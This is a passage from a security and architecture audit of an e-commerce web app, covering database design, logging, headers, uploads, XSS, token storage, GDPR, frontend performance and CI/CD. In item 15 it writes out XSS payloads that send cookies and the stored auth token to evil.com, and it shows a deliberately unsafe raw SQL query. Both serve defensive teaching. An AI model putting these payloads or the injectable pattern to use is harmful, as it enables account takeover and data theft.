  viewedAt  DateTime @default(now())
  
  @@index([productId, viewedAt]) // Popular products
  @@index([userId, viewedAt])    // User history
}

// 8. Wishlist/Favorites
model Wishlist {
  id        String   @id @default(uuid())
  userId    String
  productId String
  addedAt   DateTime @default(now())
  
  @@unique([userId, productId])
  @@index([userId])
}

// 9. Product Reviews
model Review {
  id        String   @id @default(uuid())
  productId String
  product   Product  @relation(fields: [productId], references: [id])
  userId    String
  user      User     @relation(fields: [userId], references: [id])
  orderId   String   // Must have purchased to review
  
  rating    Int      // 1-5
  title     String?
  comment   String?  @db.Text
  images    String[]
  
  isVerified Boolean @default(false) // Verified purchase
  helpful    Int     @default(0)     // Helpful count
  
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
  
  @@unique([userId, productId, orderId]) // One review per product per order
  @@index([productId, rating])
}

// 10. Discount/Coupon System
model Coupon {
  id          String     @id @default(uuid())
  code        String     @unique
  type        CouponType
  value       Decimal    @db.Decimal(10, 2)
  minOrder    Decimal?   @db.Decimal(10, 2)
  maxDiscount Decimal?   @db.Decimal(10, 2)
  
  validFrom   DateTime
  validUntil  DateTime
  usageLimit  Int?
  usageCount  Int        @default(0)
  
  isActive    Boolean    @default(true)
  
  @@index([code, isActive])
  @@index([validFrom, validUntil])
}

enum CouponType {
  PERCENTAGE
  FIXED_AMOUNT
  FREE_SHIPPING
}

model OrderCoupon {
  id       String  @id @default(uuid())
  orderId  String
  couponId String
  discount Decimal @db.Decimal(10, 2)
  
  @@unique([orderId, couponId])
}
```

### Database Performance Tuning

```sql
-- 1. Composite Index for Common Queries
CREATE INDEX idx_products_active_price ON Product(isActive, price) WHERE deletedAt IS NULL;

-- 2. Partial Index (MySQL 8.0+)
CREATE INDEX idx_orders_pending ON Order(userId, createdAt) WHERE status = 'PENDING';

-- 3. Covering Index (Include frequently selected columns)
CREATE INDEX idx_products_list ON Product(isActive, createdAt) 
  INCLUDE (name, price, stockQuantity);

-- 4. Full-Text Search Index
CREATE FULLTEXT INDEX idx_products_search ON Product(name, description);

-- 5. Query Optimization
-- BEFORE (Slow):
SELECT * FROM Product WHERE isActive = true ORDER BY createdAt DESC LIMIT 20;

-- AFTER (Fast with index):
SELECT id, name, price, stockQuantity FROM Product 
WHERE isActive = true AND deletedAt IS NULL 
ORDER BY createdAt DESC 
LIMIT 20;
```

### Read Replica Setup (AWS RDS)

```typescript
// config/prisma.ts
import { PrismaClient } from '@prisma/client';

const DATABASE_URL = process.env.DATABASE_URL!; // Primary (writes)
const READ_REPLICA_URL = process.env.READ_REPLICA_URL; // Replica (reads)

// Primary client (writes)
export const prisma = new PrismaClient({
  datasources: { db: { url: DATABASE_URL } },
});

// Read replica client (reads only)
export const prismaRead = READ_REPLICA_URL
  ? new PrismaClient({ datasources: { db: { url: READ_REPLICA_URL } } })
  : prisma; // Fallback to primary if no replica

// Usage
// services/product.service.ts
async getAllProducts() {
  return await prismaRead.product.findMany({ ... }); // Read from replica
}

async createProduct(data) {
  return await prisma.product.create({ data }); // Write to primary
}
```

### Database Sharding Strategy (Future - 1M+ Users)

```
User Sharding by ID Hash:
- Shard 1: Users with ID hash 0-33333333
- Shard 2: Users with ID hash 33333334-66666666
- Shard 3: Users with ID hash 66666667-99999999

Geographic Sharding:
- Shard US: US users
- Shard EU: EU users
- Shard APAC: Asia users
```

**Implementation Priority:**
- Soft deletes + Audit: 🟡 HIGH (Week 3)
- Indexes: 🚨 IMMEDIATE (Week 2)
- Read replicas: 🟢 MEDIUM (Week 5)
- Sharding: 🟢 FUTURE (1M+ users)

---

---

## 🔐 SECURITY HARDENING CHECKLIST

### 12. **CONSOLE.LOG EVERYWHERE - NO STRUCTURED LOGGING**
**Severity:** 🟡 HIGH - PRODUCTION DEBUGGING NIGHTMARE

**Current State (Found 50+ instances):**
```typescript
// apps/api/src/app.ts
console.log(`${req.method} ${req.path} - Origin: ${req.headers.origin}`);
console.error('❌ Error:', err);

// apps/api/src/controllers/*.ts
console.error('Create product error:', error);
console.log('✓ Created:', category.name);
```

**Issues:**
1. **No structured logging** - Cannot parse logs programmatically
2. **No log levels** (DEBUG, INFO, WARN, ERROR, FATAL)
3. **No request tracing** - Cannot debug multi-request flows
4. **No log aggregation** - Logs lost when containers restart
5. **No sensitive data filtering** - May log passwords, tokens
6. **No performance metrics** - No request duration tracking

**Amazon/Flipkart Standard:**
- Winston or Pino for structured logging
- ELK Stack (Elasticsearch, Logstash, Kibana) or Datadog
- Request ID tracing (X-Request-ID header)
- Log sampling for high traffic
- Automated alerts on error spikes

**Required Implementation:**
```bash
npm install pino pino-pretty
npm install pino-http express-request-id
```

```typescript
// config/logger.ts
import pino from 'pino';

export const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  formatters: {
    level: (label) => ({ level: label }),
  },
  redact: {
    paths: ['req.headers.authorization', 'password', 'token', 'email'],
    remove: true,
  },
  transport: process.env.NODE_ENV !== 'production' ? {
    target: 'pino-pretty',
    options: { colorize: true },
  } : undefined,
});

// app.ts
import pinoHttp from 'pino-http';
import { v4 as uuidv4 } from 'uuid';

// Add request ID middleware
app.use((req, res, next) => {
  req.id = req.headers['x-request-id'] || uuidv4();
  res.setHeader('X-Request-ID', req.id);
  next();
});

// Structured HTTP logging
app.use(pinoHttp({
  logger,
  customLogLevel: (req, res, err) => {
    if (res.statusCode >= 500 || err) return 'error';
    if (res.statusCode >= 400) return 'warn';
    return 'info';
  },
  customSuccessMessage: (req, res) => {
    return `${req.method} ${req.url} ${res.statusCode} - ${res.responseTime}ms`;
  },
}));

// Usage in controllers
// BEFORE:
console.error('Create product error:', error);

// AFTER:
logger.error({
  err: error,
  userId: req.user?.id,
  productData: req.body,
  requestId: req.id,
}, 'Failed to create product');

// BEFORE:
console.log('✓ Created:', category.name);

// AFTER:
logger.info({
  categoryId: category.id,
  categoryName: category.name,
  userId: req.user?.id,
  requestId: req.id,
}, 'Category created successfully');
```

**Log Aggregation Setup (Production):**
```typescript
// For AWS CloudWatch
import { CloudWatchLogsClient, PutLogEventsCommand } from '@aws-sdk/client-cloudwatch-logs';

// For Datadog
import { datadogLogs } from '@datadog/browser-logs';

// For self-hosted ELK
// Configure Filebeat to ship logs to Elasticsearch
```

**Implementation Priority:** 🟡 HIGH (Week 3)

---

### 13. **MISSING CORS SECURITY HEADERS**
**Severity:** 🟡 HIGH - CLICKJACKING & XSS RISKS

**Current Headers (via Helmet):**
```typescript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      imgSrc: ["'self'", "https://robohatch-products.s3.eu-north-1.amazonaws.com"],
    },
  },
}));
```

**Missing Critical Headers:**
```typescript
// Required enterprise-grade headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Avoid unsafe-inline in production!
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      imgSrc: ["'self'", "data:", "https:", "blob:"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      connectSrc: ["'self'", process.env.FRONTEND_URL],
      frameSrc: ["'none'"], // Prevent clickjacking
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [], // Force HTTPS
    },
  },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: { policy: "same-origin" },
  crossOriginResourcePolicy: { policy: "same-origin" },
  dnsPrefetchControl: { allow: false },
  frameguard: { action: "deny" }, // X-Frame-Options: DENY
  hsts: {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  },
  ieNoOpen: true,
  noSniff: true, // X-Content-Type-Options: nosniff
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  xssFilter: true,
}));

// CSRF Protection
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

app.post('/api/admin/*', csrfProtection, ...);
```

**Implementation Priority:** 🟡 HIGH (Week 2)

---

### 14. **NO RATE LIMITING ON FILE UPLOADS**
**Severity:** 🟡 HIGH - DOS/STORAGE ABUSE

**Current Issue:**
```typescript
// product.controller.ts
const upload = multer({
  storage: multerS3({...}),
  limits: {
    fileSize: 10 * 1024 * 1024, // 10MB - Too large!
  },
});
```

**Problems:**
1. **No rate limit on uploads** - Attacker can flood S3 storage
2. **10MB per file** - Too large for product images
3. **No file type validation** - Can upload executables
4. **No malware scanning** - Can upload infected files
5. **No image optimization** - Storing full-resolution images

**Required Fixes:**
```typescript
// middleware/upload.middleware.ts
import multer from 'multer';
import sharp from 'sharp';

const ALLOWED_MIME_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
const MAX_FILE_SIZE = 2 * 1024 * 1024; // 2MB
const MAX_FILES_PER_REQUEST = 5;

const upload = multer({
  storage: multer.memoryStorage(), // Process in memory first
  limits: {
    fileSize: MAX_FILE_SIZE,
    files: MAX_FILES_PER_REQUEST,
  },
  fileFilter: (req, file, cb) => {
    // Validate MIME type
    if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
      return cb(new Error('Invalid file type. Only JPEG, PNG, WebP allowed.'));
    }
    
    // Validate file extension
    const ext = file.originalname.split('.').pop()?.toLowerCase();
    if (!['jpg', 'jpeg', 'png', 'webp'].includes(ext || '')) {
      return cb(new Error('Invalid file extension.'));
    }
    
    cb(null, true);
  },
});

// Image processing middleware
export async function processImages(req: Request, res: Response, next: NextFunction) {
  if (!req.files || !Array.isArray(req.files)) return next();
  
  try {
    const processedFiles = await Promise.all(
      req.files.map(async (file) => {
        // Optimize and resize
        const optimized = await sharp(file.buffer)
          .resize(1200, 1200, { fit: 'inside', withoutEnlargement: true })
          .webp({ quality: 85 })
          .toBuffer();
        
        // Upload to S3
        const key = `products/${uuidv4()}.webp`;
        await s3Client.send(new PutObjectCommand({
          Bucket: AWS_S3_BUCKET,
          Key: key,
          Body: optimized,
          ContentType: 'image/webp',
          CacheControl: 'max-age=31536000', // 1 year
        }));
        
        return {
          url: `https://${AWS_S3_BUCKET}.s3.${AWS_REGION}.amazonaws.com/${key}`,
          size: optimized.length,
        };
      })
    );
    
    req.processedFiles = processedFiles;
    next();
  } catch (error) {
    logger.error({ err: error }, 'Image processing failed');
    res.status(400).json({ success: false, message: 'Image processing failed' });
  }
}

// Rate limit for uploads
const uploadRateLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 20, // 20 uploads per hour per IP
  message: 'Too many uploads, please try again later',
});

// Usage
router.post('/products', 
  uploadRateLimiter,
  upload.array('images', 5),
  processImages,
  productController.createProduct
);
```

**Implementation Priority:** 🟡 HIGH (Week 3)

---

### 15. **NO INPUT SANITIZATION FOR XSS**
**Severity:** 🔴 CRITICAL - XSS ATTACKS

**Current State:**
```typescript
// Product name stored as-is, no sanitization
const product = await prisma.product.create({
  data: {
    name: req.body.name, // <script>alert('XSS')</script>
    description: req.body.description, // <img src=x onerror=alert(1)>
  },
});
```

**Attack Vector:**
```bash
POST /api/admin/products
{
  "name": "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
  "description": "<img src=x onerror=\"fetch('https://evil.com/steal?data='+localStorage.getItem('auth-storage'))\">"
}
```

**Required Fix:**
```bash
npm install dompurify jsdom validator
```

```typescript
// utils/sanitize.ts
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';
import validator from 'validator';

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window as any);

export function sanitizeHTML(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
  });
}

export function sanitizePlainText(text: string): string {
  return validator.escape(text);
}

// middleware/sanitize.middleware.ts
export function sanitizeBody(req: Request, res: Response, next: NextFunction) {
  function sanitizeValue(value: any): any {
    if (typeof value === 'string') {
      return sanitizePlainText(value);
    }
    if (Array.isArray(value)) {
      return value.map(sanitizeValue);
    }
    if (value && typeof value === 'object') {
      return Object.keys(value).reduce((acc, key) => {
        acc[key] = sanitizeValue(value[key]);
        return acc;
      }, {} as any);
    }
    return value;
  }
  
  req.body = sanitizeValue(req.body);
  next();
}

// app.ts
app.use(express.json());
app.use(sanitizeBody); // Sanitize ALL inputs
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1)

---

### 16. **NO SQL INJECTION PROTECTION BEYOND PRISMA**
**Severity:** 🟡 MEDIUM - RISK IF RAW QUERIES ADDED

**Current State:**
✅ Prisma protects against SQL injection in queries
❌ BUT: If raw SQL is used, vulnerable

**Example Vulnerable Code (if added):**
```typescript
// DANGEROUS (if someone adds this):
await prisma.$queryRaw`
  SELECT * FROM Product WHERE name LIKE '%${req.query.search}%'
`; // SQL INJECTION!

// SAFE:
await prisma.$queryRaw`
  SELECT * FROM Product WHERE name LIKE ${'%' + req.query.search + '%'}
`; // Parameterized
```

**Recommendation:**
- Never use `$queryRawUnsafe`
- Always use parameterized queries with `$queryRaw`
- Add ESLint rule to ban raw SQL

```json
// .eslintrc.json
{
  "rules": {
    "no-restricted-syntax": [
      "error",
      {
        "selector": "CallExpression[callee.property.name='$queryRawUnsafe']",
        "message": "Use $queryRaw with parameterized queries instead"
      }
    ]
  }
}
```

**Implementation Priority:** 🟢 LOW (Already protected by Prisma)

---

### 17. **NO API AUTHENTICATION FOR PUBLIC ENDPOINTS**
**Severity:** 🟡 MEDIUM - SCRAPING/DDOS RISK

**Current Issue:**
```typescript
// Completely public - No auth required
router.get('/products', productController.getAllProducts);
router.get('/categories', categoryController.getAllCategories);
```

**Problem:**
- Scrapers can harvest all product data
- DDoS bots can query repeatedly
- No usage tracking per client

**Solution (API Keys for Public Endpoints):**
```typescript
// middleware/apiKey.middleware.ts
export async function verifyApiKey(req: Request, res: Response, next: NextFunction) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ success: false, message: 'API key required' });
  }
  
  const client = await prisma.apiClient.findUnique({
    where: { apiKey: apiKey as string },
  });
  
  if (!client || !client.isActive) {
    return res.status(403).json({ success: false, message: 'Invalid API key' });
  }
  
  // Track usage
  await redis.incr(`api:usage:${client.id}:${Date.now().toString().slice(0, -5)}`);
  
  req.apiClient = client;
  next();
}

// Schema addition
model ApiClient {
  id        String   @id @default(uuid())
  name      String
  apiKey    String   @unique
  isActive  Boolean  @default(true)
  rateLimit Int      @default(100) // Per minute
  createdAt DateTime @default(now())
}

// Usage
router.get('/products', verifyApiKey, productController.getAllProducts);
```

**For Internal Use Only:**
- Frontend gets API key via environment variable
- Mobile apps get API key on first launch
- External APIs must request key

**Implementation Priority:** 🟢 MEDIUM (Week 4)

---

### 18. **JWT TOKENS STORED IN LOCALSTORAGE - XSS VULNERABLE**
**Severity:** 🔴 CRITICAL - TOKEN THEFT VIA XSS

**Current Frontend (apps/web/src/store/auth.store.ts):**
```typescript
// Zustand persist to localStorage
persist(
  (set, get) => ({ ... }),
  { name: 'auth-storage' } // Stored in localStorage!
);
```

**Problem:**
- XSS attack can steal token: `localStorage.getItem('auth-storage')`
- Token valid for 7 days = Long exposure window

**Amazon/Flipkart Pattern:**
- **Access tokens** in memory or httpOnly cookies
- **Refresh tokens** in httpOnly, secure, SameSite cookies
- CSRF protection for cookie-based auth

**Required Changes:**

**Backend (Cookie-based refresh tokens):**
```typescript
// services/auth.service.ts
async login(input: LoginInput) {
  // ... validate credentials
  
  const accessToken = jwt.sign(payload, JWT_SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '30d' });
  
  // Store refresh token in DB
  await prisma.refreshToken.create({
    data: { userId: user.id, token: refreshToken, expiresAt: ... },
  });
  
  return { accessToken, refreshToken };
}

// controllers/auth.controller.ts
async login(req: Request, res: Response) {
  const { accessToken, refreshToken } = await authService.login(req.body);
  
  // Set refresh token in httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,     // Cannot be accessed by JavaScript
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
  });
  
  // Send access token in response (stored in memory only)
  return res.json({ success: true, accessToken });
}
```

**Frontend (Memory-only access tokens):**
```typescript
// store/auth.store.ts
interface AuthState {
  accessToken: string | null; // Memory only, NOT persisted
  user: User | null;
  isAuthenticated: boolean;
}

export const useAuthStore = create<AuthState>()((set) => ({
  accessToken: null, // NO PERSIST!
  user: null,
  isAuthenticated: false,
  
  setAuth: (user, accessToken) => set({ user, accessToken, isAuthenticated: true }),
  logout: () => set({ user: null, accessToken: null, isAuthenticated: false }),
}));

// On app load, refresh token from cookie
useEffect(() => {
  async function refreshAuth() {
    try {
      const res = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include', // Send cookies
      });
      const { accessToken } = await res.json();
      setAuth(user, accessToken);
    } catch (err) {
      logout();
    }
  }
  refreshAuth();
}, []);
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 2)

---

### 19. **NO GDPR COMPLIANCE - DATA PRIVACY RISK**
**Severity:** 🟡 HIGH - LEGAL/REGULATORY RISK

**Missing:**
1. **No privacy policy** page
2. **No cookie consent** banner
3. **No data export** (user can't download their data)
4. **No account deletion** (right to be forgotten)
5. **No data retention policy** (how long data is kept)
6. **No audit logs** (who accessed what when)

**Required Implementation:**
```typescript
// controllers/user.controller.ts

// Data Export (GDPR Article 15)
async exportUserData(req: AuthRequest, res: Response) {
  const userId = req.user!.id;
  
  const data = {
    user: await prisma.user.findUnique({ where: { id: userId } }),
    orders: await prisma.order.findMany({ where: { userId } }),
    cart: await prisma.cart.findUnique({ where: { userId } }),
    addresses: await prisma.address.findMany({ where: { userId } }),
    customDesigns: await prisma.customDesign.findMany({ where: { userId } }),
  };
  
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="user-data-${userId}.json"`);
  res.json(data);
}

// Account Deletion (GDPR Article 17)
async deleteAccount(req: AuthRequest, res: Response) {
  const userId = req.user!.id;
  
  await prisma.$transaction([
    // Anonymize orders (keep for accounting, remove PII)
    prisma.order.updateMany({
      where: { userId },
      data: {
        shippingAddress: null,
        billingAddress: null,
        phone: 'DELETED',
        email: 'deleted@deleted.com',
      },
    }),
    
    // Delete personal data
    prisma.address.deleteMany({ where: { userId } }),
    prisma.cart.delete({ where: { userId } }),
    prisma.customDesign.deleteMany({ where: { userId } }),
    
    // Delete user account
    prisma.user.delete({ where: { id: userId } }),
  ]);
  
  res.json({ success: true, message: 'Account deleted successfully' });
}

// Data retention (automated job)
// Delete abandoned carts older than 90 days
async cleanupOldData() {
  const cutoffDate = new Date(Date.now() - 90 * 24 * 60 * 60 * 1000);
  
  await prisma.cart.deleteMany({
    where: {
      updatedAt: { lt: cutoffDate },
      user: { lastLoginAt: { lt: cutoffDate } },
    },
  });
}
```

**Frontend:**
```tsx
// components/CookieConsent.tsx
export function CookieConsent() {
  return (
    <div className="fixed bottom-0 left-0 right-0 bg-gray-900 text-white p-4">
      <p>
        We use cookies to improve your experience. By using our site, you agree to our{' '}
        <Link href="/privacy">Privacy Policy</Link>.
      </p>
      <button onClick={acceptCookies}>Accept</button>
    </div>
  );
}
```

**Implementation Priority:** 🟡 HIGH (Week 4) - Required for EU customers

---

### 20. **NO PENETRATION TESTING / SECURITY AUDITS**
**Severity:** 🟡 HIGH - UNKNOWN VULNERABILITIES

**Recommended Actions:**
1. **Automated Security Scanning:**
   - `npm audit` (already available)
   - Snyk or Dependabot for dependency vulnerabilities
   - OWASP ZAP for automated penetration testing
   
2. **Manual Security Testing:**
   - Third-party penetration testing (annual)
   - Bug bounty program (HackerOne, Bugcrowd)
   
3. **Security Headers Testing:**
   - https://securityheaders.com/
   - https://observatory.mozilla.org/

**Implementation Priority:** 🟢 MEDIUM (Ongoing)

---

## 🚀 FRONTEND ENTERPRISE AUDIT

### 21. **NO REACT QUERY USAGE DESPITE BEING INSTALLED**
**Severity:** 🟡 MEDIUM - SUBOPTIMAL DATA FETCHING

**Current State:**
```typescript
// providers.tsx - React Query configured ✓
const queryClient = new QueryClient({ ... });

// BUT components use direct fetch!
// app/admin/products/page.tsx
useEffect(() => {
  const products = await apiClient.getProducts();
  setProducts(products);
}, []);
```

**Problems:**
1. **No automatic refetching** - Stale data
2. **No caching** - Same query = multiple requests
3. **Manual loading states** - Boilerplate everywhere
4. **No optimistic updates** - Slow UX
5. **No pagination/infinite scroll** - Load all data at once

**Recommended Refactor:**
```typescript
// hooks/useProducts.ts
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

export function useProducts() {
  return useQuery({
    queryKey: ['products'],
    queryFn: () => apiClient.getProducts(),
    staleTime: 5 * 60 * 1000, // 5 minutes
  });
}

export function useProduct(id: string) {
  return useQuery({
    queryKey: ['products', id],
    queryFn: () => apiClient.getProduct(id),
    enabled: !!id,
  });
}

export function useCreateProduct() {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: (data: CreateProductInput) => apiClient.createProduct(data),
    onSuccess: () => {
      // Invalidate and refetch
      queryClient.invalidateQueries({ queryKey: ['products'] });
    },
  });
}

// Usage in component
function ProductList() {
  const { data, isLoading, error } = useProducts();
  const createProduct = useCreateProduct();
  
  if (isLoading) return <Spinner />;
  if (error) return <Error />;
  
  return (
    <div>
      {data.map(product => <ProductCard key={product.id} product={product} />)}
      <button onClick={() => createProduct.mutate({ ... })}>Add</button>
    </div>
  );
}
```

**Benefits:**
- ✅ Automatic caching
- ✅ Background refetching
- ✅ Optimistic updates
- ✅ Loading/error states handled
- ✅ Server state sync

**Implementation Priority:** 🟡 MEDIUM (Week 4)

---

### 22. **NO CODE SPLITTING - LARGE BUNDLE SIZE**
**Severity:** 🟡 MEDIUM - SLOW INITIAL LOAD

**Current State:**
```typescript
// All components loaded upfront
import ProductCard from '@/components/ProductCard';
import AdminDashboard from '@/app/admin/page';
```

**Impact:**
- Large JavaScript bundle (500KB+)
- Slow Time to Interactive (TTI)
- Poor Lighthouse score

**Solution (Next.js Dynamic Imports):**
```typescript
// app/admin/products/page.tsx
import dynamic from 'next/dynamic';

// Lazy load admin components
const ProductForm = dynamic(() => import('@/components/ProductForm'), {
  loading: () => <Spinner />,
  ssr: false, // Client-side only
});

const RichTextEditor = dynamic(() => import('@/components/RichTextEditor'), {
  loading: () => <p>Loading editor...</p>,
  ssr: false,
});

// Lazy load heavy libraries
const Chart = dynamic(() => import('react-chartjs-2'), { ssr: false });
```

**Route-Based Code Splitting:**
```typescript
// app/layout.tsx
export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html>
      <body>
        <Suspense fallback={<PageLoader />}>
          {children}
        </Suspense>
      </body>
    </html>
  );
}
```

**Implementation Priority:** 🟡 MEDIUM (Week 5)

---

### 23. **NO IMAGE OPTIMIZATION**
**Severity:** 🟡 MEDIUM - SLOW PAGE LOAD

**Current State:**
```tsx
// Unoptimized images from S3
<img src={product.images[0].url} alt={product.name} />
```

**Issues:**
- No lazy loading
- No responsive images
- No WebP format
- No placeholders (CLS issues)

**Solution (Next.js Image Component):**
```tsx
import Image from 'next/image';

<Image
  src={product.images[0].url}
  alt={product.name}
  width={600}
  height={600}
  placeholder="blur"
  blurDataURL={product.images[0].placeholder}
  sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
  priority={index < 3} // LCP optimization
/>
```

**Advanced: Generate Blurhash Placeholders**
```typescript
// On product upload
import { encode } from 'blurhash';
import sharp from 'sharp';

const buffer = await sharp(image).resize(32, 32).raw().ensureAlpha().toBuffer();
const blurhash = encode(buffer, 32, 32, 4, 4);

// Store in database
await prisma.productImage.create({
  data: {
    url,
    blurhash, // 20-character string
  },
});
```

**Implementation Priority:** 🟡 MEDIUM (Week 5)

---

### 24. **NO SEO OPTIMIZATION**
**Severity:** 🟡 HIGH - POOR DISCOVERABILITY

**Missing:**
1. **No meta tags** (title, description, OG tags)
2. **No sitemap.xml**
3. **No robots.txt**
4. **No structured data** (Product schema)
5. **No canonical URLs**

**Solution:**
```tsx
// app/products/[id]/page.tsx
import { Metadata } from 'next';

export async function generateMetadata({ params }: { params: { id: string } }): Promise<Metadata> {
  const product = await getProduct(params.id);
  
  return {
    title: `${product.name} | RoboHatch`,
    description: product.description,
    openGraph: {
      title: product.name,
      description: product.description,
      images: [{ url: product.images[0].url }],
      type: 'product',
    },
    twitter: {
      card: 'summary_large_image',
      title: product.name,
      description: product.description,
      images: [product.images[0].url],
    },
  };
}

// Structured Data (JSON-LD)
export default function ProductPage({ product }: { product: Product }) {
  const structuredData = {
    '@context': 'https://schema.org',
    '@type': 'Product',
    name: product.name,
    description: product.description,
    image: product.images.map(img => img.url),
    offers: {
      '@type': 'Offer',
      price: product.price,
      priceCurrency: 'INR',
      availability: product.stockQuantity > 0 ? 'InStock' : 'OutOfStock',
    },
    aggregateRating: {
      '@type': 'AggregateRating',
      ratingValue: product.averageRating,
      reviewCount: product.reviewCount,
    },
  };
  
  return (
    <>
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(structuredData) }}
      />
      {/* Product UI */}
    </>
  );
}
```

**Sitemap & Robots:**
```typescript
// app/sitemap.ts
export default async function sitemap() {
  const products = await prisma.product.findMany({ where: { isActive: true } });
  
  return [
    { url: 'https://robohatch.in', lastModified: new Date() },
    { url: 'https://robohatch.in/products', lastModified: new Date() },
    ...products.map(p => ({
      url: `https://robohatch.in/products/${p.id}`,
      lastModified: p.updatedAt,
    })),
  ];
}

// app/robots.ts
export default function robots() {
  return {
    rules: {
      userAgent: '*',
      allow: '/',
      disallow: ['/admin', '/api'],
    },
    sitemap: 'https://robohatch.in/sitemap.xml',
  };
}
```

**Implementation Priority:** 🟡 HIGH (Week 3) - Critical for organic traffic

---

### 25. **NO ERROR BOUNDARY - CRASHES BREAK ENTIRE APP**
**Severity:** 🟡 MEDIUM - POOR UX ON ERRORS

**Solution:**
```tsx
// components/ErrorBoundary.tsx
'use client';

import { Component, ReactNode } from 'react';

interface Props {
  children: ReactNode;
  fallback?: ReactNode;
}

interface State {
  hasError: boolean;
  error?: Error;
}

export class ErrorBoundary extends Component<Props, State> {
  constructor(props: Props) {
    super(props);
    this.state = { hasError: false };
  }
  
  static getDerivedStateFromError(error: Error): State {
    return { hasError: true, error };
  }
  
  componentDidCatch(error: Error, errorInfo: any) {
    console.error('Error caught by boundary:', error, errorInfo);
    // Send to error tracking (Sentry)
  }
  
  render() {
    if (this.state.hasError) {
      return this.props.fallback || (
        <div className="error-container">
          <h2>Something went wrong</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Try again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

// app/layout.tsx
<ErrorBoundary>
  {children}
</ErrorBoundary>
```

**Implementation Priority:** 🟢 MEDIUM (Week 5)

---

## 📦 DEVOPS & DEPLOYMENT AUDIT

### 26. **NO CI/CD PIPELINE**
**Severity:** 🟡 HIGH - MANUAL DEPLOYMENT RISKS

**Current State:**
- Manual deployments to Vercel/Railway
- No automated testing before deploy
- No rollback strategy
- No deployment notifications

**Required CI/CD (GitHub Actions):**
```yaml
# .github/workflows/ci.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Lint
        run: npm run lint
      
      - name: Type check
        run: npm run type-check
      
      - name: Run tests
        run: npm test
      
      - name: Build
        run: npm run build
      
      - name: Security audit
        run: npm audit --audit-level=high
  
  deploy-staging:
    needs: test
    if: github.ref == 'refs/heads/develop'
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to Staging
        run: |
          curl -X POST ${{ secrets.VERCEL_HOOK_STAGING }}
          
  deploy-production:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Deploy to Production
        run: |
          curl -X POST ${{ secrets.VERCEL_HOOK_PRODUCTION }}
      
      - name: Run smoke tests
        run: npm run test:e2e -- --baseUrl=https://robohatch.in
      
      - name: Notify Slack
        uses: slackapi/slack-github-action@v1
        with:
          webhook-url: ${{ secrets.SLACK_WEBHOOK }}
          payload: |
            {
              "text": "🚀 Production deployment successful!"
            }
```

**Implementation Priority:** 🟡 HIGH (Week 3)

---

### 27. **NO MONITORING / OBSERVABILITY**
**Severity:** 🔴 CRITICAL - BLIND IN PRODUCTION

**Missing:**
1. **No error tracking** (Sentry)
2. **No performance monitoring** (Datadog, New Relic)
3. **No uptime monitoring** (Pingdom, UptimeRobot)
4. **No log aggregation** (CloudWatch, Datadog)
5. **No alerting** (PagerDuty, Slack)

**Required Setup:**

**A) Error Tracking (Sentry):**
```bash
npm install @sentry/nextjs @sentry/node
```

```typescript
// apps/api/src/app.ts
import * as Sentry from '@sentry/node';

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 0.1, // 10% of requests
});

app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.errorHandler());

// apps/web/sentry.client.config.ts
Sentry.init({
  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
  tracesSampleRate: 0.1,
  replaysSessionSampleRate: 0.1,
  replaysOnErrorSampleRate: 1.0,
});
```

**B) Performance Monitoring (Datadog APM):**
```typescript
import { datadogLambda } from 'datadog-lambda-js';
import { tracer } from 'dd-trace';

tracer.init({
  service: 'robohatch-api',
  env: process.env.NODE_ENV,
});

// Auto-instrument Express
tracer.use('express');
tracer.use('prisma');
```

**C) Uptime Monitoring:**
- UptimeRobot: Ping https://robohatch.in/health every 5 minutes
